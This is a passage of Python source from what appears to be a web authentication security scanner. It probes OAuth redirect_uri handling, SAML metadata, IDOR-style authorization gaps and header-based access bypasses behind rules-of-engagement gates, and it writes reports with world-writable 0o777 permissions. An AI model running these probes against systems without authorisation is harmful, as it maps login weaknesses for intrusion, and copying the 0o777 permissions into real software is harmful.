    "jwt_kid_shape": ("High", "CVSS ~7.5", "kid injection surface."),
    "sso_logout_live": ("Medium", "CVSS ~5.3", "SSO logout state live shape."),
}
try:
    SEVERITY_HINTS.update(SEVERITY_HINTS_V22)
except NameError:
    SEVERITY_HINTS = dict(SEVERITY_HINTS_V22)

SEVERITY_HINTS_V23 = {
    # v23 Stage W - password hygiene / stuffing posture
    "pwd_hygiene_weak": ("Medium", "CVSS ~5.3", "Password hygiene weak - policy/autocomplete/transport gap."),
    "stuffing_posture_weak": ("High", "CVSS ~7.1", "Credential-stuffing resistance kamzor - composite posture OPEN/PARTIAL."),
    # v23 Stage X - remember-me / session properties
    "rememberme_long_lived": ("Medium", "CVSS ~6.1", "Persistent login cookie lambi validity ka - theft window bada."),
    "session_property_gap": ("Medium", "CVSS ~5.3", "Session cookie property gap (Secure/HttpOnly/SameSite/prefix)."),
    # v23 Stage Y - recovery/KBA + login sequencing
    "recovery_kba_present": ("Medium", "CVSS ~5.8", "KBA/security-question recovery path - guessable secret surface."),
    "recovery_path_open": ("Low", "CVSS ~3.1", "Recovery/unlock surface publicly reachable (census note)."),
    "login_sequence_gap": ("Medium", "CVSS ~5.3", "Login sequence external redirect par jaata hai - phishing surface."),
    # v23 Stage Z - SSO grants / token binding / header posture
    "sso_implicit_grant": ("High", "CVSS ~7.4", "Implicit/password grant shape - token leakage surface."),
    "token_binding_absent": ("Info", "CVSS ~2.1", "Token-binding/DPoP/mTLS indicator nahi mila (catalog note)."),
    "auth_header_posture_gap": ("Medium", "CVSS ~5.3", "Auth endpoint security headers missing (HSTS/CSP/COOP family)."),
}
try:
    SEVERITY_HINTS.update(SEVERITY_HINTS_V23)
except NameError:
    SEVERITY_HINTS = dict(SEVERITY_HINTS_V23)


# ===========================================================================
# P21 v22 HELPERS - canary / inert / feedforward / shape utilities
# ===========================================================================
def _canary(kind="c"):
    """Canary value generator - sab INERT census isi family ke."""
    return "%s_%s_%s" % (CANARY, kind, rand_str(6))


def _rwx_result(path):
    try:
        os.chmod(path, 0o777)
    except OSError:
        pass
    return path


def _rwx_dir(path):
    try:
        os.makedirs(path, exist_ok=True)
        os.chmod(path, 0o777)
    except OSError:
        pass
    return path


def _rwx_save_json(path, obj):
    d = os.path.dirname(path)
    if d:
        _rwx_dir(d)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(obj, f, indent=2, default=str)
    return _rwx_result(path)


def _rwx_save_text(path, text):
    d = os.path.dirname(path)
    if d:
        _rwx_dir(d)
    with open(path, "w", encoding="utf-8") as f:
        f.write(text if isinstance(text, str) else str(text))
    return _rwx_result(path)


def _artifact(base_dir, mod, fname):
    """Seed-artifact path resolver (engagement dir me <mod>/fname)."""
    return os.path.join(base_dir, mod, fname)


def _read_json_tolerant(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return None


def _read_text_tolerant(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return f.read()
    except Exception:
        return ""


def _deep_get(d, *keys):
    """Nested dict/list safe-get."""
    cur = d
    for k in keys:
        if isinstance(cur, dict):
            cur = cur.get(k)
        elif isinstance(cur, list) and isinstance(k, int) and 0 <= k < len(cur):
            cur = cur[k]
        else:
            return None
        if cur is None:
            return None
    return cur


def path_only(url):
    try:
        return urllib.parse.urlsplit(url).path or "/"
    except Exception:
        return "/"


def urljoin_safe(base, ref):
    try:
        return urllib.parse.urljoin(base, ref)
    except Exception:
        return base


def _abs_urls_from_text(txt, base):
    out = []
    for m in re.finditer(r"https?://[^\s\"'<>,\)\]]+", txt or ""):
        u = m.group(0).rstrip(").,;")
        if u not in out:
            out.append(u)
    for m in re.finditer(r"[\"'\(](/[A-Za-z0-9_\-./?=&%]+)[\"'\)]", txt or ""):
        u = urljoin_safe(base, m.group(1))
        if u not in out:
            out.append(u)
    return out[:40]


def _ff_from_engagement(base_dir):
    """Engagement-level feedforward reader - P21 feeder modules (18)."""
    out = {}
    for mod in ("understand", "passive", "active", "content", "tech", "js",
                "surface", "sessions", "access", "inject", "xss", "client",
                "ssrf", "files", "api", "graphql", "ws", "logic"):
        p = _artifact(base_dir, mod, "feedforward.json")
        d = _read_json_tolerant(p)
        if isinstance(d, dict):
            out[mod] = d.get("routing") or {}
    return out


def read_feedforward_safe(base_dir):
    try:
        return _ff_from_engagement(base_dir)
    except Exception:
        return {}


def _ff_flag(ff, mod, key):
    """Feedforward routing flag presence (truthy list/dict)."""
    node = _deep_get(ff, mod, key)
    if isinstance(node, (list, dict, tuple)):
        return bool(node)
    return bool(node)


def assert_auth_inert(http):
    """P21 INERT guard - koi POST-payload destructive marker bhejna hi nahi.
    (fail-fast: agar http client me destructive method expose hua to error)"""
    banned = ("DROP", "DELETE_ALL", "PURGE", "SHUTDOWN", "RM_RF")
    for b in banned:
        assert b not in getattr(http, "__dict__", {}), "INERT violation: %s" % b
    return True


def mine_oauth_params(url):
    """URL ke oauth/oidc query params -> census dict."""
    try:
        q = urllib.parse.urlsplit(url).query
        params = urllib.parse.parse_qsl(q, keep_blank_values=True)
    except Exception:
        params = []
    interesting = {}
    for k, v in params:
        kl = k.lower()
        if kl in ("response_type", "client_id", "redirect_uri", "scope",
                  "state", "nonce", "code_challenge", "code_challenge_method",
                  "prompt", "audience", "resource", "request_uri"):
            interesting[k] = truncate(str(v), 80)
    return interesting


def classify_authz_path(path):
    """Path -> privileged shape classify (admin/manage/console/root)."""
    p = (path or "").lower()
    row = {"path": path, "privileged_shape": False, "shape": None}
    for pat, shape in ((r"admin|manage|console|backoffice|staff", "admin_console"),
                       (r"root|superuser|su\b", "superuser"),
                       (r"internal|private|secret", "internal"),
                       (r"role|perm|grant|acl", "role_shape"),
                       (r"users?/\d+|account/\d+|order/\d+", "id_path"),
                       (r"api/v\d+/(admin|internal)", "api_admin")):
        if re.search(pat, p):
            row["privileged_shape"] = True
            row["shape"] = shape
            break
    return row


# ===========================================================================
# P21 STAGE J - OAuth/OIDC DEEP CENSUS (read-only GET + offline decode)
# ===========================================================================
def oauth_deep_census(http, oauth_eps, meta, conf):
    """OIDC discovery + endpoint census + PKCE/state/nonce shape + id_token
    offline decode + JWKS headers. GET-only, cap conf['auth_oauth_probes']."""
    rows = {"discovery": [], "endpoints": [], "rows": [], "id_tokens": [],
            "jwks": {}, "error_shape": None}
    cap = max(1, int(conf.get("auth_oauth_probes", 4)))
    seen = set()
    # ---- discovery docs ----
    if conf.get("auth_allow_oauth_census", True):
        for base in list(oauth_eps)[:cap]:
            root = "%s://%s" % (urllib.parse.urlsplit(base).scheme,
                                urllib.parse.urlsplit(base).netloc)
            for dp in OIDC_DISCOVERY_PATHS:
                u = root + dp
                if u in seen:
                    continue
                seen.add(u)
                meta["probes_total"] = meta.get("probes_total", 0) + 1
                r = http.get(u)
                if r is None:
                    continue
                body = r.text or ""
                doc = None
                if "json" in (r.header("Content-Type") or "" or "") \
                        or body.strip()[:1] in ("{", "["):
                    try:
                        doc = json.loads(body)
                    except Exception:
                        doc = None
                if isinstance(doc, dict) and ("authorization_endpoint" in doc
                                              or "issuer" in doc):
                    rec = {"url": u, "issuer": doc.get("issuer"),
                           "endpoints": {k: doc.get(k) for k in
                                         OAUTH_ENDPOINT_KEYS if doc.get(k)},
                           "scopes_supported": doc.get("scopes_supported") or [],
                           "response_types_supported":
                               doc.get("response_types_supported") or [],
                           "grant_types_supported":
                               doc.get("grant_types_supported") or [],
                           "code_challenge_methods":
                               doc.get("code_challenge_methods_supported") or [],
                           "claims_supported": doc.get("claims_supported") or [],
                           "frontchannel_logout":
                               bool(doc.get("frontchannel_logout_supported")),
                           "backchannel_logout":
                               bool(doc.get("backchannel_logout_supported"))}
                    rows["discovery"].append(rec)
                    # endpoint census rows
                    for k, v in rec["endpoints"].items():
                        rows["endpoints"].append({"key": k, "url": v})
                    if "jwks_uri" in rec["endpoints"] and conf.get("auth_jwks_fetch"):
                        ju = rec["endpoints"]["jwks_uri"]
                        jr = http.get(ju)
                        if jr is not None:
                            rows["jwks"] = {
                                "url": ju, "status": jr.status,
                                "cache_control":
                                    (jr.header("Cache-Control") or ""),
                                "keys_present":
                                    "keys" in (jr.text or "")[:4000],
                                "x5u_present": "x5u" in (jr.text or "")[:4000]}
                    break
    # ---- per-endpoint shape census ----
    for u in list(oauth_eps)[:cap]:
        sp = urllib.parse.urlsplit(u)
        shape = mine_oauth_params(u)
        rec = {"url": u, "status": None, "params": shape,
               "pkce": None, "state": None, "nonce": None,
               "response_type": shape.get("response_type"),
               "scope": shape.get("scope"), "verdict": "NOISE"}
        if shape:
            rec["pkce"] = ("present" if shape.get("code_challenge")
                           else "absent")
            rec["state"] = ("present" if shape.get("state") else "absent")
            rec["nonce"] = ("present" if shape.get("nonce") else "absent")
            if rec["pkce"] == "absent":
                rec["verdict"] = "SUSPECTED"
            if rec["state"] == "absent":
                rec["verdict"] = "SUSPECTED"
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        r = http.get(u)
        if r is not None:
            rec["status"] = r.status
        # ---- v22 behavioral PKCE/state census (2 GETs, authorize only) ----
        if "authorize" in (sp.path or "").lower():
            base_q = {"response_type": "code",
                      "client_id": _canary("cl"),
                      "redirect_uri": "%s://%s/cb" % (sp.scheme, sp.netloc),
                      "scope": "openid"}
            q1 = dict(base_q)
            q1["state"] = _canary("st")
            q1["nonce"] = _canary("nc")
            u1 = urllib.parse.urlunsplit((sp.scheme, sp.netloc, sp.path,
                                          urllib.parse.urlencode(q1), ""))
            meta["probes_total"] = meta.get("probes_total", 0) + 1
            r1 = http.get(u1, allow_redirects=False)
            redir1 = bool(r1 and r1.status in (301, 302, 303, 307, 308))
            rec["pkce"] = "absent" if redir1 else                 ("enforced" if r1 and r1.status >= 400 else "unknown")
            q2 = dict(base_q)          # state DROP karke
            u2 = urllib.parse.urlunsplit((sp.scheme, sp.netloc, sp.path,
                                          urllib.parse.urlencode(q2), ""))
            meta["probes_total"] = meta.get("probes_total", 0) + 1
            r2 = http.get(u2, allow_redirects=False)
            redir2 = bool(r2 and r2.status in (301, 302, 303, 307, 308))
            rec["state"] = "absent" if redir2 else                 ("enforced" if r2 and r2.status >= 400 else "unknown")
            rec["nonce"] = "shape-only"
            rec["behavior"] = {"with_state": r1.status if r1 else None,
                               "without_state": r2.status if r2 else None,
                               "redirected": redir1 or redir2}
            if rec["pkce"] == "absent" or rec["state"] == "absent":
                rec["verdict"] = "SUSPECTED"
        rows["rows"].append(rec)
    # ---- id_token offline decode (harvested pre-auth JWTs reuse) ----
    for t in (rows.get("_harvest") or []):
        info_ = jwt_info(t)
        if info_:
            claims = info_.get("claims") or {}
            rows["id_tokens"].append({
                "alg": info_.get("header", {}).get("alg"),
                "iss": claims.get("iss"), "aud": claims.get("aud"),
                "azp": claims.get("azp"), "nonce": claims.get("nonce"),
                "exp_present": "exp" in claims,
                "email_present": "email" in claims,
                "roles_present": any(k in claims for k in
                                     ("roles", "role", "groups", "scp", "scope"))})
    return rows


def oauth_error_shape_oracle(http, auth_url, meta, conf):
    """Error-shape differential: invalid_client vs invalid_request vs
    bad redirect_uri - sirf response SHAPE observe (canary client_id).
    GET-only; koi real token exchange NAHI."""
    out = {"rows": [], "differential": None}
    if not (conf.get("auth_allow_oauth_census", True) and auth_url):
        return out
    sp = urllib.parse.urlsplit(auth_url)
    base_q = urllib.parse.parse_qsl(sp.query, keep_blank_values=True)
    variants = [
        ("canary_client", [("client_id", _canary("cl"))]),
        ("empty_client", [("client_id", "")]),
        ("bad_redirect", [("redirect_uri", _canary("rd"))]),
        ("bad_response_type", [("response_type", _canary("rt"))]),
    ]
    shapes = {}
    for label, over in variants:
        q = dict(base_q)
        q.update(dict(over))
        u = urllib.parse.urlunsplit((sp.scheme, sp.netloc, sp.path,
                                     urllib.parse.urlencode(q), ""))
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        r = http.get(u)
        if r is None:
            continue
        body = (r.text or "")[:400]
        shapes[label] = {"status": r.status, "len": len(r.body or ""),
                         "error_key": ("error" if '"error"' in body or
                                       "error=" in body else
                                       "err_key_absent" if r.status >= 400
                                       else "2xx_shape")}
        out["rows"].append({"variant": label, **shapes[label]})
    st = {v["status"] for v in shapes.values()}
    if len(st) > 1 or len({v["error_key"] for v in shapes.values()}) > 1:
        out["differential"] = "error_shape_diff"
    return out


# ===========================================================================
# P21 STAGE K - OAUTH VARIANT CENSUS (GATED auth_allow_oauth_variant_probe)
# redirect_uri allowlist shape - same-origin canary targets, ZERO egress
# ===========================================================================
def oauth_variant_census(http, oauth_eps, meta, conf):
    """redirect_uri allowlist shape census. SIRF tab jab RoE gate ON ho.
    Har variant same-origin/host canary shape - redirect follow NAHI karta,
    sirf Location echo/status observe. Hard cap conf['auth_oauth_variant_cap']."""
    out = {"gated": True, "ran": False, "rows": [], "cap": int(
        conf.get("auth_oauth_variant_cap", 6))}
    if not conf.get("auth_allow_oauth_variant_probe", False):
        out["note"] = ("RoE gate OFF (auth_allow_oauth_variant_probe) -> "
                       "documented-only: OAUTH_VARIANT_SHAPES list check karo")
        return out
    out["ran"] = True
    auth_eps = [u for u in oauth_eps if
                "authorize" in u.lower() or "auth" in path_only(u).lower()]
    cap = min(out["cap"], max(1, len(auth_eps) or 1))
    for u in list(auth_eps)[:cap]:
        if len(out["rows"]) >= out["cap"]:
            break
        sp = urllib.parse.urlsplit(u)
        q = dict(urllib.parse.parse_qsl(sp.query, keep_blank_values=True))
        if "redirect_uri" not in q:
            q["redirect_uri"] = "%s://%s/callback" % (sp.scheme, sp.netloc)
        for shape, tail in OAUTH_VARIANT_SHAPES[:out["cap"]]:
            if len(out["rows"]) >= out["cap"]:
                break
            cand = q["redirect_uri"] + tail if tail.startswith("/") and \
                not tail.startswith("//") else tail
            q2 = dict(q)
            q2["redirect_uri"] = cand
            u2 = urllib.parse.urlunsplit((sp.scheme, sp.netloc, sp.path,
                                          urllib.parse.urlencode(q2), ""))
            meta["probes_total"] = meta.get("probes_total", 0) + 1
            r = http.get(u2, allow_redirects=False)
            if r is None:
                continue
            loc = r.header("Location") or ""
            accepted = bool(loc) and r.status in (301, 302, 303, 307, 308)
            err_shape = ("error=" in (r.text or "")[:600] or
                         r.status in (400, 401, 403, 422))
            out["rows"].append({
                "url": u, "shape": shape, "canary_redirect": cand,
                "status": r.status, "location": truncate(loc, 100),
                "redirect_echo": accepted, "error_shape": err_shape,
                "verdict": "CONFIRMED" if accepted else
                           ("HARDENED" if err_shape else "NOISE")})
            if accepted:
                break   # ek target par pehla accepted variant kaafi hai
    return out


# ===========================================================================
# P21 STAGE L - SAML surface census (metadata/ACS + XSW documented playbook)
# ===========================================================================
def saml_deep_census(http, saml_eps, meta, conf):
    """SAML SP/IdP shape: metadata open, ACS census, binding shapes.
    XSW techniques DOCUMENTED-ONLY (execution FORBIDDEN without RoE wave)."""
    out = {"gated": False, "rows": [], "metadata": None,
           "playbooks": [n for n, _ in DOCUMENTED_SAML_TECHNIQUES]}
    cap = max(1, int(conf.get("auth_surface_cap", 25)) // 4)
    for u in list(saml_eps)[:cap]:
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        r = http.get(u)
        if r is None:
            continue
        body = r.text or ""
        row = {"url": u, "status": r.status,
               "metadata_open": bool(r.status == 200 and
                                     ("<EntityDescriptor" in body or
                                      "md:EntityDescriptor" in body)),
               "acs_present": bool(re.search(r"AssertionConsumerService", body)),
               "slo_present": bool("SingleLogoutService" in body),
               "binding_post": bool("HTTP-POST" in body),
               "binding_redirect": bool("HTTP-Redirect" in body),
               "signed_assertion_hint": bool("SignAssertion" in body or
                                             "wantAssertionsSigned" in body),
               "relaystate_present": bool("RelayState" in body)}
        out["rows"].append(row)
        if row["metadata_open"]:
            out["metadata"] = {"url": u, "sha1": sha1(body)}
    return out


# ===========================================================================
# P21 STAGE M - AUTHZ MATRIX (GATED auth_allow_authz_matrix)
# horizontal canary differential + vertical pre-auth census
# ===========================================================================
def authz_matrix_census(http, targets, privileged_targets, meta, conf):
    """Authorization matrix census:
      - VERTICAL: privileged paths pre-auth GET -> 200/30x/403 classify
      - HORIZONTAL: same id-path canary A vs canary B differential (shape)
    RoE gate auth_allow_authz_matrix (default OFF); cap auth_authz_matrix_cap."""
    out = {"gated": True, "ran": False, "vertical": [], "horizontal": [],
           "cap": int(conf.get("auth_authz_matrix_cap", 8)),
           "privileged_targets": privileged_targets[:6]}
    if not conf.get("auth_allow_authz_matrix", False):
        out["note"] = ("RoE gate OFF (auth_allow_authz_matrix) -> documented-"
                       "only: horizontal/vertical differential playbook")
        return out
    out["ran"] = True
    cap = out["cap"]
    used = 0
    # ---- vertical: privileged paths pre-auth ----
    vp = [t for t in privileged_targets
          if classify_authz_path(path_only(t)).get("privileged_shape")]
    vp = vp or [t for t in privileged_targets][:3]
    for t in vp:
        if used >= cap:
            break
        used += 1
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        r = http.get(t, allow_redirects=False)
        if r is None:
            continue
        cls = ("open" if r.status == 200 else
               "redirect" if r.status in (301, 302, 303, 307, 308) else
               "denied" if r.status in (401, 403) else "other")
        out["vertical"].append({"url": t, "status": r.status, "class": cls,
                                "verdict": "CONFIRMED" if cls == "open"
                                else ("SUSPECTED" if cls == "redirect"
                                      else "HARDENED")})
    # ---- horizontal: id-path canary A vs B ----
    idpaths = [t for t in targets if classify_authz_path(path_only(t))
               .get("shape") == "id_path"]
    for t in idpaths:
        if used >= cap:
            break
        a = t.replace("/1", "/" + str(random.randint(100000, 999999))) \
            if re.search(r"/\d+", t) else t
        b = t.replace("/1", "/" + str(random.randint(100000, 999999))) \
            if re.search(r"/\d+", t) else t
        if a == b:
            continue
        used += 2
        ra = http.get(a, allow_redirects=False)
        rb = http.get(b, allow_redirects=False)
        if ra is None or rb is None:
            continue
        diff = (ra.status != rb.status or
                len(ra.body or "") != len(rb.body or ""))
        shape_a = _json_error_shape(ra.body or "") if ra else ""
        shape_b = _json_error_shape(rb.body or "") if rb else ""
        out["horizontal"].append({
            "url": t, "canary_a": path_only(a), "canary_b": path_only(b),
            "status_a": ra.status, "status_b": rb.status,
            "shape_diff": bool(shape_a != shape_b),
            "verdict": "CONFIRMED" if diff and
                       (ra.status == 200 or rb.status == 200) else
                       ("SUSPECTED" if diff else "HARDENED")})
    return out


# ===========================================================================
# P21 STAGE N - HEADER TRUST CENSUS (canary echo, read-only)
# ===========================================================================
def header_trust_census(http, targets, meta, conf):
    """XFF / X-Original-URL / X-Rewrite-URL / X-Forwarded-Host canary echo
    census. GET-only, hard cap conf['auth_header_trust_cap']."""
    out = {"rows": [], "cap": int(conf.get("auth_header_trust_cap", 6))}
    if not conf.get("auth_allow_header_trust", True):
        out["note"] = "header-trust census disabled (config)"
        return out
    tgts = list(targets)[:out["cap"]]
    canary_ip = "203.0.113.%d" % random.randint(7, 250)
    for u in tgts:
        for hname, hval in HEADER_TRUST_HEADERS:
            if hname == "X-Forwarded-For" or hname == "X-Custom-IP-Authorization":
                hval = canary_ip
            meta["probes_total"] = meta.get("probes_total", 0) + 1
            r = http.get(u, headers={hname: hval})
            if r is None:
                continue
            body = (r.text or "")[:20000]
            echoed = hval in body or hval in (r.header(hname) or "")
            url_changed = False
            if hname == "X-Original-URL" or hname == "X-Rewrite-URL":
                url_changed = (r.status not in (404, 405) and
                               "canaryP21" in body)
            if echoed or url_changed:
                out["rows"].append({
                    "url": u, "header": hname, "canary": truncate(hval, 40),
                    "echo": echoed, "body_shape_change": url_changed,
                    "status": r.status,
                    "verdict": "CONFIRMED" if (echoed or url_changed)
                    else "NOISE"})
                break   # ek header hit kaafi hai per target
    return out


# ===========================================================================
# P21 STAGE Q - TOKEN LIFECYCLE CENSUS (refresh shape / remember-me / logout)
# ===========================================================================
def token_lifecycle_census(http, live, cookie_report, meta, conf):
    """Lifecycle census (GET-shape only):
      - refresh/grant endpoint shape discovery (feedforward + path hints)
      - remember-me cookie entropy (offline - token_predictability reuse)
      - logout-state census: GET logout -> cookie cleared shape
      - session-fixation shape: pre-auth cookie set observed?"""
    out = {"refresh_endpoints": [], "remember_me": [], "logout_state": [],
           "fixation_shape": [], "gated_probe": False}
    if not conf.get("auth_allow_lifecycle_probe", True):
        out["note"] = "lifecycle census disabled (config)"
        return out
    hints = re.compile(
        r"(?i)(refresh|grant|token|revoke|logout|signout|remember)", re.I)
    for u, rec in (live or {}).items():
        p = path_only(u)
        if not hints.search(p):
            continue
        row = {"url": u, "shape": None, "status": rec.get("status")}
        if re.search(r"(?i)refresh", p):
            row["shape"] = "refresh_endpoint_shape"
            out["refresh_endpoints"].append(row)
        elif re.search(r"(?i)(logout|signout)", p):
            row["shape"] = "logout_endpoint"
            meta["probes_total"] = meta.get("probes_total", 0) + 1
            r = http.get(u, allow_redirects=False)
            if r is not None:
                cleared = False
                for sc in (r.header("Set-Cookie") or "").splitlines():
                    low = sc.lower()
                    if ("expires=thu, 01 jan 1970" in low or
                            "max-age=0" in low):
                        cleared = True
                row.update({"status": r.status, "cookie_cleared": cleared,
                            "verdict": "HARDENED" if cleared else
                                       ("SUSPECTED" if r.status == 200
                                        else "NOISE")})
                out["logout_state"].append(row)
        elif re.search(r"(?i)(token|grant|revoke)", p):
            row["shape"] = "grant_shape"
            out["refresh_endpoints"].append(row)
    # ---- remember-me cookie entropy (offline, harvested cookies) ----
    cr_items = (cookie_report or {}).items() if isinstance(cookie_report, dict) \
        else enumerate(cookie_report or [])
    for host, cookies in cr_items:
        for c in (cookies if isinstance(cookies, list) else []):
            if not re.search(r"(?i)(remember|persist|autologin|perm)",
                             str(c.get("name", ""))):
                continue
            val = str(c.get("value") or "")
            if len(val) < 8:
                continue
            tp = token_predictability([val] * 3)
            out["remember_me"].append({
                "host": host, "cookie": c.get("name"),
                "len": len(val), "entropy": tp.get("entropy"),
                "verdict": "SUSPECTED" if (tp.get("entropy") or 4) < 3.2
                else "HARDENED"})
    # ---- session-fixation shape: login page pre-auth set-cookie? ----
    for u, rec in (live or {}).items():
        if rec.get("set_cookie") and rec.get("has_password"):
            out["fixation_shape"].append({
                "url": u, "pre_auth_cookie": True,
                "cookie_count": len(rec.get("set_cookie") or []),
                "verdict": "NOISE"})
            break
    return out


# ===========================================================================
# P21 STAGE R - POLICY + ANTI-AUTO CENSUS (marker shapes, read-only)
# ===========================================================================
def policy_captcha_census(live, forms_census, conf):
    """Password-policy inference aggregate + CAPTCHA/anti-automation marker
    census - sab offline shape analysis (0 extra requests)."""
    out = {"policy_rows": [], "captcha_rows": [], "anti_auto": [],
           "summary": {}}
    pol_hits = 0
    for u, rec in (live or {}).items():
        pol = _password_policy_hint(rec.get("forms"))
        if pol:
            pol_hits += 1
            weak = []
            try:
                ml = int(pol.get("maxlength") or 0)
            except Exception:
                ml = 0
            if ml and ml < 8:
                weak.append("min_length_%d" % ml)
            if not pol.get("pattern"):
                weak.append("no_complexity_rule")
            if pol.get("autocomplete", "on").lower() in ("", "on"):
                weak.append("autocomplete_on")
            out["policy_rows"].append({"url": u, "policy": pol,
                                       "weak_flags": weak,
                                       "verdict": "SUSPECTED" if weak
                                       else "HARDENED"})
        for f in (rec.get("forms") or []):
            txt = json.dumps(f)
            if CAPTCHA_RE.search(txt):
                out["captcha_rows"].append({"url": u,
                                            "marker": "captcha_marker"})
                break
            if re.search(r"(?i)otp|2fa|totp|onetime", txt):
                out["captcha_rows"].append({"url": u,
                                            "marker": "otp_field_present"})
                break
        else:
            out["captcha_rows"].append({"url": u, "marker": "captcha_absent"})
    anti = [r for r in out["captcha_rows"] if r["marker"] == "captcha_absent"]
    for r in anti:
        out["anti_auto"].append({"url": r["url"], "verdict": "ABSENT"})
    out["summary"] = {"policy_endpoints": pol_hits,
                      "captcha_absent": len(anti),
                      "captcha_present": len(out["captcha_rows"]) - len(anti)}
    return out



# ===========================================================================
# P21 v23 STAGE W - PASSWORD HYGIENE + STUFFING POSTURE (passive, 0-req)
# ===========================================================================
PERSIST_COOKIE_RE = re.compile(
    r"(?i)(remember|persist|autologin|perm|stay[-_]?logged|keep[-_]?logged)")
RECOVERY_PATH_RE = re.compile(
    r"(?i)(recover|unlock|backup[-_]?code|security[-_]?(question|answer)"
    r"|kba|forgot|reset-mfa|mfa[-_]?reset)")
KBA_RE = re.compile(
    r"(?i)(security[\s_-]*question|mother'?s[\s_-]*maiden|first[\s_-]*pet"
    r"|maiden[\s_-]*name|birth[\s_-]*(place|city)|secret[\s_-]*(question|answer)"
    r"|childhood[\s_-]*(street|friend)|favourite[\s_-]*(teacher|food))")
TOKEN_BINDING_MARKERS_RE = re.compile(
    r"(?i)(dpop|token[-_]?binding|mtls|mutual[-_]?tls|cnf[\s\"':=]|"
    r"tls[-_]?client[-_]?cert|cert[-_]?bound)")
SECURITY_HEADER_SET = ("strict-transport-security", "content-security-policy",
                       "referrer-policy", "x-content-type-options",
                       "cross-origin-opener-policy",
                       "cross-origin-resource-policy",
                       "cross-origin-embedder-policy", "permissions-policy")
SSO_RISK_GRANTS = ("implicit", "password", "token id_token")


def password_hygiene_matrix(live, conf):
    """Stage W (passive, 0 extra requests): per-form password-hygiene rows -
    policy hint + autocomplete + maxlength + cleartext transport composite."""
    out = {"rows": [], "summary": {}, "enabled":
           bool(conf.get("auth23_password_matrix", True))}
    if not out["enabled"]:
        out["note"] = "password hygiene matrix disabled (config)"
        return out
    for u, rec in (live or {}).items():
        if not rec.get("has_password") and not rec.get("forms"):
            continue
        pol = _password_policy_hint(rec.get("forms"))
        try:
            ml = int((pol or {}).get("maxlength") or 0)
        except Exception:
            ml = 0
        autocomplete = (pol or {}).get("autocomplete", "on") or "on"
        cleartext = _is_cleartext(u)
        weak_flags = []
        if ml and ml < 10:
            weak_flags.append("maxlength_%d" % ml)
        if not (pol or {}).get("pattern"):
            weak_flags.append("no_complexity_rule")
        if str(autocomplete).lower() in ("", "on"):
            weak_flags.append("autocomplete_on")
        if cleartext:
            weak_flags.append("cleartext_transport")
        score = 4 - len(weak_flags)
        verdict = ("WEAK" if score <= 1 else
                   "MODERATE" if score <= 2 else "STRONG")
        out["rows"].append({"url": u, "maxlength": ml or None,
                            "pattern_present": bool((pol or {}).get("pattern")),
                            "autocomplete": str(autocomplete)[:16],
                            "cleartext": cleartext,
                            "weak_flags": weak_flags, "score": score,
                            "verdict": verdict})
    weak_n = sum(1 for r in out["rows"] if r["verdict"] == "WEAK")
    out["summary"] = {"forms_scored": len(out["rows"]), "weak": weak_n,
                      "moderate": sum(1 for r in out["rows"]
                                      if r["verdict"] == "MODERATE"),
                      "strong": sum(1 for r in out["rows"]
                                    if r["verdict"] == "STRONG")}
    return out


def stuffing_posture_census(login_eps, live, rl_report, enum_report,
                            policy_captcha, defense):
    """Stage W (passive composite, 0 extra requests): credential-stuffing
    resistance per login endpoint - rl/enum/captcha/policy points 0..6."""
    out = {"rows": [], "summary": {}, "enabled":
           bool(True)}
    anti_auto = {r.get("url") for r in
                 (policy_captcha or {}).get("anti_auto", [])}
    for u in (login_eps or []):
        d = ((defense or {}).get("endpoints") or {}).get(u) or {}
        pts = dict(d.get("points") or {})
        rl_res = (rl_report or {}).get(u) or {}
        enum_res = ((enum_report or {}).get("endpoints") or {}).get(u) or {}
        weak_flags = []
        resistance = 0
        if pts.get("rate_limit"):
            resistance += 1
        else:
            weak_flags.append("no_rate_limit")
        if pts.get("lockout_model"):
            resistance += 1
        else:
            weak_flags.append("no_lockout_model")
        if pts.get("captcha") and u not in anti_auto:
            resistance += 1
        else:
            weak_flags.append("no_captcha")
        if pts.get("generic_error") and not enum_res.get("enumeration_likely"):
            resistance += 1
        else:
            weak_flags.append("enum_leak")
        if pts.get("csrf_token"):
            resistance += 1
        else:
            weak_flags.append("no_csrf")
        if pts.get("mfa_present"):
            resistance += 1
        else:
            weak_flags.append("no_mfa")
        verdict = ("OPEN" if resistance <= 2 else
                   "PARTIAL" if resistance <= 4 else "RESISTANT")
        out["rows"].append({"url": u, "resistance": resistance, "max": 6,
                            "weak_flags": weak_flags, "verdict": verdict})
    out["summary"] = {
        "logins": len(out["rows"]),
        "open": sum(1 for r in out["rows"] if r["verdict"] == "OPEN"),
        "partial": sum(1 for r in out["rows"] if r["verdict"] == "PARTIAL"),
        "resistant": sum(1 for r in out["rows"] if r["verdict"] == "RESISTANT")}
    return out


# ===========================================================================
# P21 v23 STAGE X - REMEMBER-ME PERSISTENCE + SESSION PROPERTY MATRIX
# ===========================================================================
def _cookie_lifetime_bucket(flags):
    ma = (flags or {}).get("max_age")
    if ma is None:
        return "session-scoped"
    if ma <= 86400:
        return "<1d"
    if ma <= 2592000:
        return "<=30d"
    return ">30d"


def rememberme_census(http, live, cookie_report, meta, conf):
    """Stage X: persistent-login cookie census (passive) + RoE-gated 2-GET
    persistence shape (canary-only, read-only)."""
    out = {"rows": [], "probe_rows": [], "gated": False, "summary": {}}
    for host, cookies in (cookie_report or {}).items():
        for c in (cookies if isinstance(cookies, list) else []):
            if not PERSIST_COOKIE_RE.search(str(c.get("name", ""))):
                continue
            flags = c.get("flags") or {}
            bucket = _cookie_lifetime_bucket(flags)
            gaps = list(c.get("missing") or [])
            if bucket == ">30d":
                gaps.append("lifetime_>30d")
            elif bucket == "<=30d":
                gaps.append("lifetime_>1d")
            out["rows"].append({
                "host": host, "cookie": c.get("name"),
                "lifetime_bucket": bucket, "max_age": flags.get("max_age"),
                "gaps": gaps,
                "verdict": "SUSPECTED" if gaps else "HARDENED"})
    # ---- RoE-gated behavioral shape: 2-sequential GET (read-only) ----
    gate = bool(conf.get("auth23_allow_rememberme_probe", False))
    out["gated"] = gate
    if gate and http is not None:
        cap = max(1, int(conf.get("auth23_rememberme_cap", 4)))
        hints = re.compile(r"(?i)(remember|login|session|persist)", re.I)
        cands = [u for u in (live or {})
